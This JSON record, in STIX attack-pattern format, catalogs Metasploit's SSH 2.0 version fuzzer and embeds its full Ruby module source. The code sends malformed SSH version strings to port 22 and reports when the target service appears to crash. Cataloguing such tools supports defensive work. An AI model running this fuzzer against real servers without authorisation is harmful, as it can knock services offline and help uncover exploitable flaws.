{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--cee174e4-5dc6-46ad-99e6-d37b714621b7",
    "created": "2024-08-14T16:26:30.969602Z",
    "modified": "2024-08-14T16:26:30.969605Z",
    "name": "SSH 2.0 Version Fuzzer",
    "description": " This module sends a series of SSH requests with malicious version strings. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/fuzzers/ssh/ssh_version_2.rb",
            "external_id": "ssh_version_2.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Fuzzer\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'SSH 2.0 Version Fuzzer',\n      'Description'    => %q{\n        This module sends a series of SSH requests with malicious version strings.\n      },\n      'Author'         => [ 'hdm' ],\n      'License'        => MSF_LICENSE\n    ))\n    register_options([\n      Opt::RPORT(22)\n    ])\n  end\n\n  def do_ssh_version(pkt,opts={})\n    @connected = false\n    connect\n    @connected = true\n\n    @banner = sock.get_once(-1,opts[:banner_timeout])\n    return if not @banner\n    sock.put(\"#{pkt}\\r\\n\")\n  end\n\n  def run\n    last_str = nil\n    last_inp = nil\n    last_err = nil\n\n    ver = make_ssh_version_base\n    cnt = 0\n\n    fuzz_strings do |str|\n      cnt += 1\n\n      pkt = ver + str\n\n      if(cnt % 100 == 0)\n        print_status(\"Fuzzing with iteration #{cnt} using #{@last_fuzzer_input}\")\n      end\n\n      begin\n        r = do_ssh_version(str,:banner_timeout => 5)\n      rescue ::Interrupt\n        print_status(\"Exiting on interrupt: iteration #{cnt} using #{@last_fuzzer_input}\")\n        raise $!\n      rescue ::Exception => e\n        last_err = e\n      ensure\n        disconnect\n      end\n\n      if(not @connected)\n        if(last_str)\n          print_status(\"The service may have crashed: iteration:#{cnt-1} method=#{last_inp} string=#{last_str.unpack(\"H*\")[0]} error=#{last_err}\")\n        else\n          print_status(\"Could not connect to the service: #{last_err}\")\n        end\n        return\n      end\n\n      if(not @banner)\n        print_status(\"The service may have crashed (no banner): iteration:#{cnt-1} method=#{last_inp} string=#{last_str.unpack(\"H*\")[0]} \")\n        return\n      end\n\n      last_str = str\n      last_inp = @last_fuzzer_input\n    end\n  end\n\n  def make_ssh_version_base\n    \"SSH-2.0-\"\n  end\nend\n"
}